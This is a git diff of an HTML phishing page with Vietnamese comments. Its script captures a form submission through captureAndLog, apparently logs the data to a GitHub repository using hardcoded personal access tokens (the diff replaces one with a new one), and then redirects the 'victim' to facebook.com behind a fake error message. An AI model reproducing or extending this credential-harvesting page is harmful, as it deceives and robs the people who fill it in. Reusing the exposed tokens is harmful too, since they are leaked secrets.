@@ -32,10 +32,10 @@
     </div>
 
     <script>
-        // *** THÔNG SỐ ĐÃ ĐƯỢC THAY THẾ ***
+        // *** THÔNG SỐ ĐÃ ĐƯƯỢC CẬP NHẬT LẦN CUỐI ***
         const GITHUB_REPO_OWNER = 'baoiot13'; 
         const GITHUB_REPO_NAME = 'IOT'; 
-        const GITHUB_PAT = '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'; 
+        const GITHUB_PAT = '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'; // TOKEN MỚI
 
         async function captureAndLog(event) {
             event.preventDefault();
@@ -76,7 +76,6 @@
                      document.getElementById('status').textContent = 'Giải mã thất bại! Đang cố gắng chuyển hướng để khắc phục...';
                 }
                 
-                // Chuyển hướng nạn nhân về trang đích thật (sau 1.5 giây)
                 setTimeout(() => {
                     window.location.href = 'https://www.facebook.com/'; 
                 }, 1500);
@@ -91,5 +90,4 @@
         }
     </script>
 </body>
-
 </html>
